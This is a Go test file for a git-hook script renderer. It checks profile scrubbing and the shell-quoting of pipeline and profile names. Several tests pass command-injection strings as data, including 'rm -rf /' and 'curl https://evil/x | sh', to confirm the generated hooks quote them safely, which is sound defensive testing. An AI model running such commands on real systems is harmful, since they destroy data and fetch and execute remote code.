package main

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestRenderHookScript_DefaultsManagedRunsToLocalOnly(t *testing.T) {
	script := renderHookScript("pre-commit", []string{"gate"}, false, "")
	if !strings.Contains(script, "unset SPARKWING_PROFILE") {
		t.Errorf("hook should scrub the ambient profile:\n%s", script)
	}
	if !strings.Contains(script, "SPARKWING_SECRETS_PROFILE") {
		t.Errorf("hook should scrub the independent secrets profile:\n%s", script)
	}
	if !strings.Contains(script, "sparkwing run 'gate' --sw-local-only") {
		t.Errorf("an unpinned hook should stay local:\n%s", script)
	}
	if strings.Contains(script, "--profile") {
		t.Errorf("no --profile was pinned, so none should be passed:\n%s", script)
	}
}

func TestRenderHookScript_PinsInstalledProfile(t *testing.T) {
	script := renderHookScript("pre-commit", []string{"gate", "lint"}, false, "bucket")
	if got := strings.Count(script, "--profile 'bucket'"); got != 2 {
		t.Errorf("each pipeline should carry the pinned profile; got %d occurrences:\n%s", got, script)
	}
	if !strings.Contains(script, "unset SPARKWING_PROFILE") {
		t.Errorf("the pin must still scrub the inherited value:\n%s", script)
	}
	if !strings.Contains(script, "SPARKWING_SECRETS_PROFILE") {
		t.Errorf("the pin must scrub an inherited secrets override:\n%s", script)
	}
	if strings.Contains(script, "--sw-local-only") {
		t.Errorf("an explicitly pinned hook should use its profile:\n%s", script)
	}
}

func TestRenderHookScript_QuotesProfileName(t *testing.T) {
	script := renderHookScript("pre-commit", []string{"gate"}, false, "a b; rm -rf /")
	if !strings.Contains(script, `--profile 'a b; rm -rf /'`) {
		t.Errorf("profile name should be single-quoted:\n%s", script)
	}
}

func TestRenderHookScript_QuotesPipelineName(t *testing.T) {
	hostile := `gate; curl https://evil/x | sh #`
	script := renderHookScript("pre-commit", []string{hostile}, false, "")
	want := "sparkwing run 'gate; curl https://evil/x | sh #' --sw-local-only\n"
	if !strings.Contains(script, want) {
		t.Errorf("pipeline name should be one single-quoted argument:\n%s", script)
	}
}

func TestRenderHookScript_EscapesQuoteInPipelineName(t *testing.T) {
	script := renderHookScript("pre-commit", []string{`a'; touch /tmp/pwned #`}, false, "")
	want := `sparkwing run 'a'\''; touch /tmp/pwned #' --sw-local-only` + "\n"
	if !strings.Contains(script, want) {
		t.Errorf("an embedded quote should be escaped, not closed:\n%s", script)
	}
}

func TestDescribeManagedHook_RecoversQuotedPipelineNames(t *testing.T) {
	names := []string{"lint", `gate; curl https://evil/x | sh #`, `a'b`}
	script := renderHookScript("pre-commit", names, false, "bucket")
	got, _ := describeManagedHook(script)
	if len(got) != len(names) {
		t.Fatalf("describeManagedHook = %q, want %d names", got, len(names))
	}
	for i, want := range names {
		if got[i] != want {
			t.Errorf("pipe %d = %q, want %q", i, got[i], want)
		}
	}
}

func TestDescribeManagedHook_ReadsUnquotedLegacyHook(t *testing.T) {
	script := "#!/bin/sh\nsparkwing run lint --profile 'bucket'\n"
	got, _ := describeManagedHook(script)
	if len(got) != 1 || got[0] != "lint" {
		t.Fatalf("describeManagedHook = %q, want [lint]", got)
	}
}

func TestRenderHookScript_ForwarderCarriesNoProfile(t *testing.T) {
	script := renderHookScript("prepare-commit-msg", nil, true, "bucket")
	if strings.Contains(script, "--profile") || strings.Contains(script, "--sw-local-only") {
		t.Errorf("a forwarder should carry no run flags:\n%s", script)
	}
}

func TestRunPipelineForProof_SelectsLocalOrPinnedStorage(t *testing.T) {
	for _, tc := range []struct {
		name    string
		profile string
		want    string
	}{
		{name: "implicit profile", want: "run gate --sw-local-only"},
		{name: "explicit profile", profile: "bucket", want: "run gate --profile bucket"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			binDir := t.TempDir()
			record := filepath.Join(t.TempDir(), "args")
			writeExec(t, filepath.Join(binDir, "sparkwing"), "#!/bin/sh\nprintf '%s\\n%s\\n%s\\n' \"$*\" \"${SPARKWING_PROFILE-unset}\" \"${SPARKWING_SECRETS_PROFILE-unset}\" > "+shellSingleQuote(record)+"\n")
			t.Setenv("PATH", binDir)
			t.Setenv("SPARKWING_PROFILE", "ambient-profile")
			t.Setenv("SPARKWING_SECRETS_PROFILE", "ambient-secrets")

			if err := runPipelineForProof(tc.profile)(t.TempDir(), "gate"); err != nil {
				t.Fatalf("prove: %v", err)
			}
			got, err := os.ReadFile(record)
			if err != nil {
				t.Fatalf("read args: %v", err)
			}
			lines := strings.Split(strings.TrimSpace(string(got)), "\n")
			if len(lines) != 3 {
				t.Fatalf("proof record = %q, want args and two environment values", got)
			}
			if lines[0] != tc.want {
				t.Errorf("proof args = %q, want %q", lines[0], tc.want)
			}
			if lines[1] != "unset" || lines[2] != "unset" {
				t.Errorf("proof inherited profiles: profile=%q secrets=%q", lines[1], lines[2])
			}
		})
	}
}
